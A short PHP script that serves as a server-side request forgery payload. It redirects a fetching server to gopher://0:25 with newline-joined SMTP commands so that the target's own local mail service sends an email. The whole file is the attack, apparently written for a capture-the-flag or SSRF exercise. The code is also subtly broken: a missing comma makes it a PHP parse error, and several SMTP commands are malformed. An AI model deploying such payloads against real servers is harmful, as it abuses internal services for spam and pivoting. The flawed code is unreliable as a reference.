<?php
  
  $commands = array(
    'HELLO',
    'MAIL FROM <veyili9158@evernote.com>',
    'RCPT TO <veyili9158@bepureme.com>',
    'DATA',
    'Subject: @veyili9158!'
    'Hello, it worked!',
    '.'

  );

  $payload = implode('%0A', $commands);

  header('Location:gopher://0:25'.$payload);
?>
